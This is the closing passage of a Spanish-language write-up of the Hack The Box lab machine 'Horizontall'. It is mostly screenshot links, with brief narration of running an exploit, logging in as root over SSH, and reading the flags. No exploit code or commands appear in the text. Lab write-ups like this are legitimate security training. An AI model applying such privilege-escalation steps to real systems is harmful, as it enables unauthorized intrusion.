<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374bash_phpgcc_publicSSH.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Ejecutamos el exploit:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374bash_laravelPY_publicSSH.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Y si ahora intentamos autenticarnos como el usuario `root` deberíamos obtener una **Shell**:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374bash_rootSH_SSH.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

AHORA SÍÍÍÍÍÍÍÍÍÍÍÍ, tenemos una shell estable (: Veamos las flags

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374flags.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Hemo a c a b a u.

...

Una máquina con vulnerabilidades conocidas, referencias a **CVEs**, nada de adivinanzas, me gusto bastante bastante el camino.

¡Y nada, a seguir rompiendo como siempre, DE TODO!!